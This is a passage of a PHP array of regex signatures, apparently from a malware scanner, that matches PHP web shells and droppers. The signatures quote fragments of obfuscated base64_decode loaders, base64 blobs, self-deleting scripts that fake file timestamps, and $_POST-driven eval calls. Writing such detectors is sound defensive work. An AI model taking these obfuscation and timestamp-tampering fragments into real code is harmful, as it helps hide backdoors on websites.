      'label' => 'source-file tail snippet',
    ),
    87 => 
    array (
      'pattern' => '/, DIRECTORY_SEPARATOR, \\$fname\\);
\\$fname \\= str_replace\\([\\s\\S]{0,160}, DIRECTORY_SEPARATOR, \\$fname\\);

\\$p \\= strpos\\(\\$data,/',
      'label' => 'sample-specific literal chain',
    ),
    88 => 
    array (
      'pattern' => '/\\<\\?php \\$ymsckxd\\=str_ireplace\\("q","","qqqbqqqqqaqqqqqsqqqqqqeqqqq6qq4qq_qqqqqqdqqqqeqqqqcqqqqqoqqqqdqqqeqqq"\\); \\$wbyrrudyk\\="DQoJCUBlcnJvcl9yZXB/',
      'label' => 'source-file tail snippet',
    ),
    89 => 
    array (
      'pattern' => '/\\<\\?php \\$fwyqutxks\\=str_ireplace\\("y","","yybyyyyayyyysyyyyeyyy6yyyyyy4yyyy_yyydyyyyeyyyycyyyyoyyydyyyyyeyyy"\\); \\$ytwfn\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    90 => 
    array (
      'pattern' => '/if\\(\\$jfnbrsjfq\\)\\{echo \'error 403\';\\} else \\{echo \'error 404 \\: \' \\. \\$jfnbrsjfq;\\}/',
      'label' => 'source-file tail snippet',
    ),
    91 => 
    array (
      'pattern' => '/\\<\\?php \\$mxmtxb\\=str_ireplace\\("f","","ffbffaffffsffffffefffff6ffff4fff_ffffdffffeffcffffoffffdfffffefff"\\); \\$ensbst\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    92 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\$_POST                    \\[\'r\'\\]      \\(                    \\$_POST             \\[\'d\'\\]            \\(                         \'\',                 /s',
      'label' => 'source-file head-tail anchor',
    ),
    93 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply          \\(\\$option, \\$win,                 array                         \\(\\$it\\)                      \\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    94 => 
    array (
      'pattern' => '/\\<\\?php echo "czFKvsRnpu"; if \\(file_exists\\("\\.\\/init\\.partly\\.php"\\)\\)\\{ touch\\("\\.\\/init\\.partly\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*xvW/',
      'label' => 'source-file tail snippet',
    ),
    95 => 
    array (
      'pattern' => '/LypudW50ZHB5YXNwa3R1enYqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
      'label' => 'sample-specific encoded fragment',
    ),
    96 => 
    array (
      'pattern' => '/\\<\\?php \\$kuqaqxts\\=str_ireplace\\("h","","hbhhhhahhhhhhshhehhhhh6hh4hhhh_hhhhdhhhhhhehhhhchhhhhohhhhdhhhhhehh"\\); \\$tatruuwx\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    97 => 
    array (
      'pattern' => '/\\<\\?php \\$tgdaae\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$upfwxnmmn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    98 => 
    array (
      'pattern' => '/LypxbnhwZHlxciovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKnJm/',
      'label' => 'sample-specific encoded fragment',
    ),
    99 => 
    array (
      'pattern' => '/\\<\\?php echo "yYsKHeFWvB"; if \\(file_exists\\("\\.\\/watch_video\\.php"\\)\\)\\{ touch\\("\\.\\/watch_video\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Fww/',
      'label' => 'source-file tail snippet',
    ),
    100 => 
    array (
      'pattern' => '/\\<\\?php echo "wRQubMhwDF"; if \\(file_exists\\("\\.\\/error_log\\.php"\\)\\)\\{ touch\\("\\.\\/error_log\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*hmapcsZ/',
      'label' => 'source-file tail snippet',
    ),
    101 => 
    array (
      'pattern' => '/Lyp3dnh3ZXdrcHhyYSovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsv/',
      'label' => 'sample-specific encoded fragment',
    ),
    102 => 
    array (
      'pattern' => '/\\<\\?php \\$mtrgarydc\\=str_ireplace\\("q","","qqqbqqqqaqqqqsqqqqqqeqqqqq6qqqqqq4qqqqq_qqqqdqqqeqqqcqqqqoqqqdqqqqeqqq"\\); \\$cdyzbeuhey\\="DQoJCUBlcnJvcl9/',
      'label' => 'source-file tail snippet',
    ),
    103 => 
    array (
      'pattern' => '/\\<\\?php \\$pfftakr\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$bvvkyz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
      'label' => 'source-file tail snippet',
    ),
    104 => 
    array (
      'pattern' => '/\\<\\?php \\$thmvz\\=str_ireplace\\("i","","iibiiiiiiaiiisiiieiiiii6iiii4iiiii_iiiidiiieiiiiciiioiiiidiiiieii"\\); \\$htepc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    105 => 
    array (
      'pattern' => '/\\<\\?php \\$xpbmtnx\\=str_ireplace\\("x","","xxxbxxxxxxaxxxxsxxxxxexxxx6xxxx4xxxxx_xxxxdxxxexxxxcxxxoxxxxdxxxex"\\); \\$zsrsbd\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    106 => 
    array (
      'pattern' => '/\\<\\?php \\$vfrzbuu\\=str_ireplace\\("h","","hhhbhhhahhhhshhhehhhh6hhh4hhhh_hhdhhhhehhhchhhhhohhhdhhhehh"\\); \\$csxuntq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    107 => 
    array (
      'pattern' => '/Lypybmdhbnl0d3J3dyovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsv/',
      'label' => 'sample-specific encoded fragment',
    ),
    108 => 
    array (
      'pattern' => '/\\<\\?php echo "hqwMEgSMcT"; if \\(file_exists\\("\\.\\/gutscheine\\.php"\\)\\)\\{ touch\\("\\.\\/gutscheine\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*UdqKu/',
      'label' => 'source-file tail snippet',
    ),
    109 => 
    array (
      'pattern' => '/\\);\\$vppgxame\\=\\$xn\\(\\$tehat\\);user_error\\(\\$vppgxame,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    110 => 
    array (
      'pattern' => '/\\<\\?php echo "TzhvRRgxVW"; if \\(file_exists\\("\\.\\/changecurrency\\.php"\\)\\)\\{ touch\\("\\.\\/changecurrency\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\);/',
      'label' => 'source-file tail snippet',
    ),
    111 => 
    array (
      'pattern' => '/\\<\\?php echo "qyrZCdMabn"; if \\(file_exists\\("\\.\\/moderate\\.php"\\)\\)\\{ touch\\("\\.\\/moderate\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*HdUWty5se/',
      'label' => 'source-file tail snippet',
    ),
    112 => 
    array (
      'pattern' => '/\\<\\?php \\$gkaaaegnn\\=str_ireplace\\("q","","qqqbqqqaqqqqqqsqqqqqqeqq6qqqq4qqq_qqqqdqqqeqqqcqqqqqqoqqqqdqqqqeq"\\); \\$cfwxzey\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    113 => 
    array (
      'pattern' => '/\\<\\?php \\$cqvhmubftu\\=str_ireplace\\("w","","wwbwwawwwwwwswwwewww6wwww4wwwwww_wwwwdwwwwwwewwwcwwwowwwwwwdwwwwwew"\\); \\$dghvprk\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    114 => 
    array (
      'pattern' => '/\\<\\?php echo "DYYQYSFKUm"; if \\(file_exists\\("\\.\\/register2\\.php"\\)\\)\\{ touch\\("\\.\\/register2\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*565hAH5/',
      'label' => 'source-file tail snippet',
    ),
    115 => 
    array (
      'pattern' => '/\\<\\?php \\$bmrpr\\=str_ireplace\\("x","","xxxbxxxxxaxxxsxxxxxexx6xxxxx4xxxxx_xxxxdxxxxxxexxxxcxxxxxoxxxxdxxxxxxex"\\); \\$ktmzcg\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    116 => 
    array (
      'pattern' => '/\\<\\?php \\$xvuykgzevv\\=str_ireplace\\("i","","iiibiiiaiisiiieiiiii6iiiii4iiiiii_iiiiiidiiieiiiiciiiioiiiiidiiiieii"\\); \\$bxeqhmt\\="DQoJCUBlcnJvcl9yZXB/',
      'label' => 'source-file tail snippet',
    ),
    117 => 
    array (
      'pattern' => '/\\<\\?php echo "wXXUwWbYGA"; if \\(file_exists\\("\\.\\/loose_lib\\.php"\\)\\)\\{ touch\\("\\.\\/loose_lib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*QkGk95N/',
      'label' => 'source-file tail snippet',
    ),
    118 => 
    array (
      'pattern' => '/\\<\\?php \\$bsadpzugt\\=str_ireplace\\("m","","mmbmmmmammmmsmmemmmmm6mmmmm4mmmm_mmdmmmmmemmcmmmommmmmmdmmmemmm"\\); \\$cbqzn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    119 => 
    array (
      'pattern' => '/\\<\\?php \\$tdsgattt\\=str_ireplace\\("k","","kkkbkkakkkkkskkekk6kkkkk4kk_kkkkkdkkekkkkkckkkkkokkkdkkkkkekk"\\); \\$uqcqvh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    120 => 
    array (
      'pattern' => '/\\<\\?php echo "wUNcwuwZrH"; if \\(file_exists\\("\\.\\/archivo\\.php"\\)\\)\\{ touch\\("\\.\\/archivo\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*FPR30EFu3sa/',
      'label' => 'source-file tail snippet',
    ),
    121 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply           \\(\\$option, \\$win,     array                     \\(\\$it\\)             \\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    122 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}define\\(\'PATH\', __DIR__\\)           ;/s',
      'label' => 'source-file head-tail anchor',
    ),
    123 => 
    array (
      'pattern' => '/\\<\\?php \\$zrmerscsyv\\=str_ireplace\\("r","","rrrbrrrrarrrrsrrrrerrrrr6rrrrr4rr_rrrrrrdrrrrerrrrcrrrrorrrrrdrrrer"\\); \\$ecmvpfbp\\="DQoJCUBlcnJvcl9yZXB/',
      'label' => 'source-file tail snippet',
    ),
    124 => 
    array (
      'pattern' => '/\\<\\?php \\$gwnpbvu\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$wqmxwdfs\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    125 => 
    array (
      'pattern' => '/\\<\\?php echo "xhrTkbKDYD"; if \\(file_exists\\("\\.\\/resend_login\\.php"\\)\\)\\{ touch\\("\\.\\/resend_login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*r/',
      'label' => 'source-file tail snippet',
    ),
    126 => 
    array (
      'pattern' => '/\\<\\?php \\$xqckedd\\=str_ireplace\\("m","","mmbmmmmammmmmmsmmmemmmm6mmmm4mmm_mmmmmmdmmmmemmmcmmmmmmommmdmmmemmm"\\); \\$nzbycsw\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    127 => 
    array (
      'pattern' => '/\\* @package    Error Libraries[\\s\\S]{0,12000}trigger_error                           \\(  \\$win_error, E_USER_ERROR\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    128 => 
    array (
      'pattern' => '/\\<\\?php \\$ftrxmtk\\=str_ireplace\\("f","","fffbffaffsffffefff6ffff4fff_ffffdffefffffcfffofffffdfffffef"\\); \\$dcusz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
      'label' => 'source-file tail snippet',
    ),
    129 => 
    array (
      'pattern' => '/\\<\\?php \\$dteadkd\\=str_ireplace\\("n","","nbnnnnannnnnsnnennn6nnnn4nnnn_nnnndnnnnennnnncnnonnnndnnnnen"\\); \\$nxhaupqxmk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    130 => 
    array (
      'pattern' => '/\\<\\?php \\$crzkwb\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$rypxdutack\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
      'label' => 'source-file tail snippet',
    ),
    131 => 
    array (
      'pattern' => '/LypybXlucyovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKmZjZnNo/',
      'label' => 'sample-specific encoded fragment',
    ),
    132 => 
    array (
      'pattern' => '/\\<\\?php \\$qdfgv\\=str_ireplace\\("y","","ybyyyayyyyysyyeyyyy6yyy4yyyyy_yyydyyeyyyycyyoyyydyyyeyy"\\); \\$mnzkyvz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJC/',
      'label' => 'source-file tail snippet',
    ),
    133 => 
    array (
      'pattern' => '/\\<\\?php echo "DernqCWXYx"; if \\(file_exists\\("\\.\\/api\\.rubber\\.php"\\)\\)\\{ touch\\("\\.\\/api\\.rubber\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*P60fs/',
      'label' => 'source-file tail snippet',
    ),
    134 => 
    array (
      'pattern' => '/\\<\\?php \\$qsuqkzv\\=str_ireplace\\("n","","nnnbnnnnnannnsnnnnennn6nnnn4nnn_nndnnennnncnnnonnnndnnnnennn"\\); \\$fwvgvnb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    135 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}usort                  \\( \\$b, \\$a          \\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    136 => 
    array (
      'pattern' => '/\\);\\$gnncn\\=\\$heacccad\\(\\$shcas\\);user_error\\(\\$gnncn,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    137 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$phzvewn,array\\([\\s\\S]{0,160}\\)\\); \\} set_error_handler\\(/',
      'label' => 'sample-specific literal chain',
    ),
    138 => 
    array (
      'pattern' => '/Lyp3YmtlY2Z2c3pzZ2VleSovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0p/',
      'label' => 'sample-specific encoded fragment',
    ),
    139 => 
    array (
      'pattern' => '/\\<\\?php \\$xvaesku\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$nqxca\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
      'label' => 'source-file tail snippet',
    ),
    140 => 
    array (
      'pattern' => '/\\<\\?php \\$pfgbt\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ykpuxkyar\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbml/',
      'label' => 'source-file tail snippet',
    ),
    141 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$ddmqy,array\\([\\s\\S]{0,160}\\)\\); \\} set_error_handler\\(/',
      'label' => 'sample-specific literal chain',
    ),
    142 => 
    array (
      'pattern' => '/LyphaHV1cHh4cW5ud2sqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
      'label' => 'sample-specific encoded fragment',
    ),
    143 => 
    array (
      'pattern' => '/\\<\\?php echo "WbmmHNuGMD"; if \\(file_exists\\("\\.\\/realtones\\.php"\\)\\)\\{ touch\\("\\.\\/realtones\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dUasPYN/',
      'label' => 'source-file tail snippet',
    ),
    144 => 
    array (
      'pattern' => '/\\<\\?php \\$futnaxznk\\=str_ireplace\\("k","","kkkbkkkakkkkskkkkkkekkkk6kkkk4kk_kkkkkkdkkkkkekkkkckkkkokkkkkdkkkkkkekkk"\\); \\$mcbsqsfvvx\\="DQoJCUBlcnJvc/',
      'label' => 'source-file tail snippet',
    ),
    145 => 
    array (
      'pattern' => '/\\<\\?php \\$fcbtp\\=str_ireplace\\("f","","fbfffafffffsffffeff6ff4ff_ffdfffefffffcfffoffffdfffeff"\\); \\$dtrsna\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUB/',
      'label' => 'source-file tail snippet',
    ),
    146 => 
    array (
      'pattern' => '/\\<\\?php \\$mttvbba\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ksvrmd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
      'label' => 'source-file tail snippet',
    ),
    147 => 
    array (
      'pattern' => '/\\<\\?php \\$negxaspm\\=str_ireplace\\("g","","gggbgggagggsggggeggggg6ggggg4ggg_ggggdggeggggggcggogggggdggggeggg"\\); \\$yspnywxnb\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    148 => 
    array (
      'pattern' => '/LypzcXVlenZjcGduaGcqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
      'label' => 'sample-specific encoded fragment',
    ),
    149 => 
    array (
      'pattern' => '/\\<\\?php echo "mptnmQvEbT"; if \\(file_exists\\("\\.\\/error\\-500\\.php"\\)\\)\\{ touch\\("\\.\\/error\\-500\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*s2z3TVD/',
      'label' => 'source-file tail snippet',
    ),
    150 => 
    array (
      'pattern' => '/\\<\\?php \\$hugrzzmgv\\=str_ireplace\\("t","","ttbttatttstttttettttt6ttt4tttt_tttttdtttettttctttotttdtttet"\\); \\$gqwxnk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    151 => 
    array (
      'pattern' => '/Lyp1Y2tocXhmZXd1YmYqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
      'label' => 'sample-specific encoded fragment',
    ),
    152 => 
    array (
      'pattern' => '/\\<\\?php \\$rvmgzc\\=str_ireplace\\("u","","uuubuuuauuusuueuuuuu6uuuu4uuu_uuuuuduueuucuuuuouuuuuduuuuueu"\\); \\$pnhafzkf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    153 => 
    array (
      'pattern' => '/\\<\\?php \\$gmsgtwhdw\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$bpamfuprn\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUB/',
      'label' => 'source-file tail snippet',
    ),
    154 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\$License                            \\(\\)                      ;/s',
      'label' => 'source-file head-tail anchor',
    ),
    155 => 
    array (
      'pattern' => '/\\<\\?php \\$mhmdcbuyq\\=str_ireplace\\("k","","kkkbkkkkkakkskkkkkkekkkk6kkkk4kkkk_kkkkkdkkkekkkkckkkkkokkkkkkdkkkkek"\\); \\$ayketmhx\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    156 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$ssmbshvarsapnkw,array\\([\\s\\S]{0,160}GMT"\\);
\\/\\/header\\(/',
      'label' => 'sample-specific literal chain',
    ),
    157 => 
    array (
      'pattern' => '/\\<\\?php \\$nfukzg\\=str_ireplace\\("m","","mmbmmmmmmammmmsmmmmemmmmm6mmmmm4mmmm_mmmdmmmmmmemmmmmmcmmmmommmdmmmemmm"\\); \\$wdqmubtseg\\="DQoJCUBlcnJvcl9yZ/',
      'label' => 'source-file tail snippet',
    ),
    158 => 
    array (
      'pattern' => '/\\<\\?php \\$hdumyysk\\=str_ireplace\\("h","","hbhhahhhhhshhhhhehhh6hhhh4hhhh_hhhhdhhhehhhchhhohhhhdhhhhehh"\\); \\$puvpv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    159 => 
    array (
      'pattern' => '/\\<\\?php \\$yxstcb\\=str_ireplace\\("h","","hhhbhhhahhhhshhhehhhh6hhh4hhhh_hhdhhhhehhhchhhhhohhhdhhhehh"\\); \\$yxrbapfkm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    160 => 
    array (
      'pattern' => '/\\<\\?php \\$ptxeqrta\\=str_ireplace\\("i","","iiibiiiiaiiiisiiieiii6iiii4iiii_iiiidiiiiieiiiiciioiiidiiiiiieii"\\); \\$pvhtwp\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    161 => 
    array (
      'pattern' => '/\\<\\?php echo "pXZUTkFNQV"; if \\(file_exists\\("\\.\\/admin_forums\\.php"\\)\\)\\{ touch\\("\\.\\/admin_forums\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*b/',
      'label' => 'source-file tail snippet',
    ),
    162 => 
    array (
      'pattern' => '/\\<\\?php \\$ekhuygp\\=str_ireplace\\("m","","mmbmmmmmammmmmmsmmmemmmmmm6mmm4mmmm_mmdmmmmmemmmmmcmmmommmmdmmemmm"\\); \\$ksdyahy\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    163 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\$w                          \\= strtoupper     \\(\\$k\\[8\\]\\. \\$k\\[0\\]\\. \\$k\\[16\\]\\.\\$k\\[11\\]\\.\\$k\\[19\\]\\); \\$h\\=\\$\\{ \\$w \\} \\[\'d\'\\]\\(\'\', \\$\\{ \\$w \\} \\[\'f\'\\]\\(\\$\\{ \\$w \\} \\[\'s\'\\]\\("c", "",/s',
      'label' => 'source-file head-tail anchor',
    ),
    164 => 
    array (
      'pattern' => '/\\<\\?php \\$xzmbnkyyg\\=str_ireplace\\("z","","zbzzzazzzszzzzzzezzzzz6zz4zzzz_zzzzzdzzzzzezzzzzczzzzozzzzdzzzzez"\\); \\$dutfwnn\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    165 => 
    array (
      'pattern' => '/\\<\\?php \\$vsgkvd\\=str_ireplace\\("w","","wwbwwwwwwawwwwwswwewwww6wwwww4wwwww_wwwwwdwwewwwwwcwwwwwowwwwdwwwwew"\\); \\$qexzxcc\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    166 => 
    array (
      'pattern' => '/\\<\\?php echo "zqFftBSSaY"; if \\(file_exists\\("\\.\\/album_upload\\.php"\\)\\)\\{ touch\\("\\.\\/album_upload\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*9/',
      'label' => 'source-file tail snippet',
    ),
    167 => 
    array (
      'pattern' => '/\\<\\?php \\$pwasvpu\\=str_ireplace\\("x","","xxxbxxxxxaxxsxxxxxexxx6xxxxx4xxxx_xxxxxdxxxxxexxxxxcxxoxxdxxexx"\\); \\$cpagsf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    168 => 
    array (
      'pattern' => '/\\<\\?php echo "XwCFAsazMq"; if \\(file_exists\\("\\.\\/refunds\\.php"\\)\\)\\{ touch\\("\\.\\/refunds\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dZW0x6ntUv1/',
      'label' => 'source-file tail snippet',
    ),
    169 => 
    array (
      'pattern' => '/\\<\\?php \\$hbxfgvvz\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqqqeqqq6qqqqq4qq_qqqqqdqqqqeqqqqqqcqqqoqqqqqqdqqqqqeqq"\\); \\$tbvde\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    170 => 
    array (
      'pattern' => '/\\<\\?php \\$wzgvztqf\\=str_ireplace\\("v","","vvbvvavvvvvsvvvvevvvvv6vvvvv4vvv_vvvvvdvvvevvcvvvvovvvvvdvvvvevv"\\); \\$chyrdaa\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    171 => 
    array (
      'pattern' => '/\\<\\?php \\$ehxqcgz\\=str_ireplace\\("p","","pppbppappspppppeppp6ppp4pppp_pppdpppeppppcpppppopppdppppep"\\); \\$vrdqwynqh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    172 => 
    array (
